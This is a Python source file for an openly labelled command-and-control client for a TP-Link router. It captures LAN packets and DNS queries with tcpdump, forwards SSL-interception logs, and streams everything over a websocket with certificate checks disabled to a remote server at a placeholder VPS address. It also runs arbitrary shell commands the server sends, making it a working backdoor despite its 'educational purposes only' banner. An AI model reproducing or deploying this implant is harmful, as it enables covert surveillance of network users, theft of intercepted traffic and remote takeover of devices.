#!/usr/bin/env python3
"""
C2 Client for Router
Connects to C2 server and sends traffic data
"""

import asyncio
import websockets
import json
import os
import sys
import time
import logging
import subprocess
import base64
import hashlib
import hmac
import socket
import threading
from queue import Queue
import struct
import ssl

class C2Client:
    def __init__(self, server_url, auth_key, client_id=None):
        self.server_url = server_url
        self.auth_key = auth_key
        self.client_id = client_id or self._generate_client_id()
        self.connected = False
        self.traffic_queue = Queue(maxsize=10000)
        self.ssl_queue = Queue(maxsize=1000)
        self.dns_queue = Queue(maxsize=1000)
        
        # Set up logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('/tmp/c2-client.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('C2Client')
        
    def _generate_client_id(self):
        """Generate unique client ID based on MAC address"""
        try:
            # Get primary interface MAC
            mac = subprocess.check_output(
                "ip link show | grep -m1 'link/ether' | awk '{print $2}'",
                shell=True
            ).decode().strip()
            return hashlib.md5(mac.encode()).hexdigest()[:16]
        except:
            return hashlib.md5(os.urandom(16)).hexdigest()[:16]
            
    def generate_auth_token(self):
        """Generate authentication token"""
        timestamp = time.time()
        auth_hmac = hmac.new(
            self.auth_key.encode(),
            f"{self.client_id}:{timestamp}".encode(),
            hashlib.sha256
        ).hexdigest()
        
        auth_data = {
            'client_id': self.client_id,
            'timestamp': timestamp,
            'hmac': auth_hmac,
            'model': 'TP-Link Archer C7',
            'version': '1.0-educational'
        }
        
        return base64.b64encode(json.dumps(auth_data).encode()).decode()
        
    def start_packet_monitor(self):
        """Start monitoring packets from packet-interceptor"""
        def monitor_thread():
            # Read from packet interceptor log
            log_path = '/tmp/packet-interceptor.log'
            
            # Also monitor using tcpdump for additional data
            try:
                proc = subprocess.Popen(
                    ['tcpdump', '-i', 'br-lan', '-nn', '-l', '-q'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    universal_newlines=True
                )
                
                for line in proc.stdout:
                    try:
                        # Parse tcpdump output
                        parts = line.strip().split()
                        if len(parts) >= 5:
                            # Extract basic packet info
                            timestamp = parts[0]
                            
                            # Parse source and destination
                            if '>' in line:
                                src_dst = line.split('>')
                                src = src_dst[0].split()[-1]
                                dst = src_dst[1].split()[0].rstrip(':')
                                
                                # Parse IP and port
                                src_parts = src.rsplit('.', 1)
                                dst_parts = dst.rsplit('.', 1)
                                
                                packet_info = {
                                    'timestamp': time.time(),
                                    'src_ip': src_parts[0] if len(src_parts) > 1 else src,
                                    'src_port': int(src_parts[1]) if len(src_parts) > 1 and src_parts[1].isdigit() else 0,
                                    'dst_ip': dst_parts[0] if len(dst_parts) > 1 else dst,
                                    'dst_port': int(dst_parts[1]) if len(dst_parts) > 1 and dst_parts[1].isdigit() else 0,
                                    'protocol': 'TCP' if 'tcp' in line else 'UDP' if 'udp' in line else 'OTHER',
                                    'size': 0,  # Would need to parse from tcpdump -v
                                    'direction': 'outbound' if src.startswith('192.168.') else 'inbound'
                                }
                                
                                # Add to queue
                                if not self.traffic_queue.full():
                                    self.traffic_queue.put(packet_info)
                                    
                    except Exception as e:
                        self.logger.debug(f"Error parsing tcpdump line: {e}")
                        
            except Exception as e:
                self.logger.error(f"Error starting tcpdump: {e}")
                
        # Start monitor thread
        thread = threading.Thread(target=monitor_thread, daemon=True)
        thread.start()
        self.logger.info("Packet monitor started")
        
    def start_ssl_monitor(self):
        """Monitor SSL interceptions"""
        def monitor_thread():
            log_path = '/tmp/ssl-connections.json'
            
            # Watch for new SSL connections
            last_pos = 0
            while True:
                try:
                    if os.path.exists(log_path):
                        with open(log_path, 'r') as f:
                            f.seek(last_pos)
                            for line in f:
                                try:
                                    data = json.loads(line.strip())
                                    if not self.ssl_queue.full():
                                        self.ssl_queue.put(data)
                                except:
                                    pass
                            last_pos = f.tell()
                except Exception as e:
                    self.logger.debug(f"SSL monitor error: {e}")
                    
                time.sleep(1)
                
        thread = threading.Thread(target=monitor_thread, daemon=True)
        thread.start()
        self.logger.info("SSL monitor started")
        
    def start_dns_monitor(self):
        """Monitor DNS queries"""
        def monitor_thread():
            # Monitor DNS queries using tcpdump
            try:
                proc = subprocess.Popen(
                    ['tcpdump', '-i', 'any', '-nn', '-l', 'port 53'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    universal_newlines=True
                )
                
                for line in proc.stdout:
                    try:
                        if 'A?' in line or 'AAAA?' in line:
                            # Extract domain from query
                            parts = line.split()
                            for i, part in enumerate(parts):
                                if 'A?' in part:
                                    domain = parts[i+1].rstrip('.')
                                    query_data = {
                                        'timestamp': time.time(),
                                        'domain': domain,
                                        'query_type': 'A',
                                        'is_tunnel': 'tunnel' in domain
                                    }
                                    
                                    if not self.dns_queue.full():
                                        self.dns_queue.put(query_data)
                                    break
                                    
                    except Exception as e:
                        self.logger.debug(f"DNS parse error: {e}")
                        
            except Exception as e:
                self.logger.error(f"DNS monitor error: {e}")
                
        thread = threading.Thread(target=monitor_thread, daemon=True)
        thread.start()
        self.logger.info("DNS monitor started")
        
    async def handle_command(self, command):
        """Handle command from C2 server"""
        cmd_type = command.get('type')
        command_id = command.get('command_id')
        
        result = {'command_id': command_id, 'type': 'command_result'}
        
        try:
            if cmd_type == 'execute':
                # Execute system command
                cmd = command.get('command')
                proc = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=30
                )
                result['result'] = {
                    'success': proc.returncode == 0,
                    'output': proc.stdout,
                    'error': proc.stderr
                }
                
            elif cmd_type == 'update_config':
                # Update configuration
                config_data = command.get('config')
                # Implement config update logic
                result['result'] = {'success': True}
                
            elif cmd_type == 'get_status':
                # Get system status
                status = {
                    'uptime': subprocess.check_output(['uptime']).decode().strip(),
                    'memory': subprocess.check_output(['free', '-h']).decode(),
                    'connections': subprocess.check_output(['netstat', '-ant']).decode().count('\n'),
                    'services': {
                        'packet_interceptor': os.system('pgrep -f packet-interceptor > /dev/null') == 0,
                        'ssl_interceptor': os.system('pgrep -f ssl-interceptor > /dev/null') == 0,
                        'dns_tunnel': os.system('pgrep -f dns-tunnel > /dev/null') == 0
                    }
                }
                result['result'] = {'success': True, 'status': status}
                
            elif cmd_type == 'restart_service':
                # Restart a service
                service = command.get('service')
                os.system(f'/etc/init.d/{service} restart')
                result['result'] = {'success': True}
                
        except Exception as e:
            result['result'] = {'success': False, 'error': str(e)}
            
        return result
        
    async def send_traffic_batch(self, websocket):
        """Send batched traffic data"""
        packets = []
        
        # Collect packets from queue
        while not self.traffic_queue.empty() and len(packets) < 100:
            try:
                packets.append(self.traffic_queue.get_nowait())
            except:
                break
                
        if packets:
            await websocket.send(json.dumps({
                'type': 'traffic',
                'packets': packets
            }))
            
    async def send_ssl_data(self, websocket):
        """Send SSL interception data"""
        while not self.ssl_queue.empty():
            try:
                ssl_data = self.ssl_queue.get_nowait()
                await websocket.send(json.dumps({
                    'type': 'ssl_intercept',
                    **ssl_data
                }))
            except:
                break
                
    async def send_dns_data(self, websocket):
        """Send DNS query data"""
        while not self.dns_queue.empty():
            try:
                dns_data = self.dns_queue.get_nowait()
                await websocket.send(json.dumps({
                    'type': 'dns_query',
                    **dns_data
                }))
            except:
                break
                
    async def connect_to_c2(self):
        """Main connection loop to C2 server"""
        while True:
            try:
                self.logger.info(f"Connecting to C2 server at {self.server_url}")
                
                # Create SSL context that accepts self-signed certificates
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                async with websockets.connect(
                    self.server_url,
                    ssl=ssl_context
                ) as websocket:
                    # Authenticate
                    auth_token = self.generate_auth_token()
                    await websocket.send(json.dumps({'token': auth_token}))
                    
                    # Wait for auth response
                    response = await websocket.recv()
                    auth_response = json.loads(response)
                    
                    if 'error' in auth_response:
                        self.logger.error(f"Authentication failed: {auth_response['error']}")
                        await asyncio.sleep(30)
                        continue
                        
                    self.connected = True
                    self.logger.info(f"Connected to C2 server as {self.client_id}")
                    
                    # Start monitoring if not already started
                    if not hasattr(self, '_monitors_started'):
                        self.start_packet_monitor()
                        self.start_ssl_monitor()
                        self.start_dns_monitor()
                        self._monitors_started = True
                        
                    # Main communication loop
                    last_heartbeat = time.time()
                    
                    while True:
                        # Send data batches
                        await self.send_traffic_batch(websocket)
                        await self.send_ssl_data(websocket)
                        await self.send_dns_data(websocket)
                        
                        # Check for commands (with timeout)
                        try:
                            command = await asyncio.wait_for(
                                websocket.recv(), 
                                timeout=1.0
                            )
                            command_data = json.loads(command)
                            result = await self.handle_command(command_data)
                            await websocket.send(json.dumps(result))
                        except asyncio.TimeoutError:
                            pass
                            
                        # Send heartbeat every 30 seconds
                        if time.time() - last_heartbeat > 30:
                            await websocket.ping()
                            last_heartbeat = time.time()
                            
                        await asyncio.sleep(0.1)
                        
            except websockets.exceptions.ConnectionClosed:
                self.logger.warning("Connection to C2 server lost")
                self.connected = False
            except Exception as e:
                self.logger.error(f"C2 connection error: {e}")
                self.connected = False
                
            # Wait before reconnecting
            self.logger.info("Waiting 30 seconds before reconnecting...")
            await asyncio.sleep(30)
            
    def run(self):
        """Run the C2 client"""
        asyncio.run(self.connect_to_c2())


if __name__ == '__main__':
    # Configuration
    C2_SERVER = os.environ.get('C2_SERVER', 'wss://your-vps-ip:8443')
    AUTH_KEY = os.environ.get('C2_AUTH_KEY', 'change-this-secret-key')
    
    # Ensure running as root
    if os.geteuid() != 0:
        print("Error: Must run as root for packet capture")
        sys.exit(1)
        
    print("=== C2 Client for Educational Router ===")
    print("⚠️  For educational purposes only!")
    print(f"Connecting to: {C2_SERVER}")
    print("")
    
    client = C2Client(C2_SERVER, AUTH_KEY)
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down C2 client...")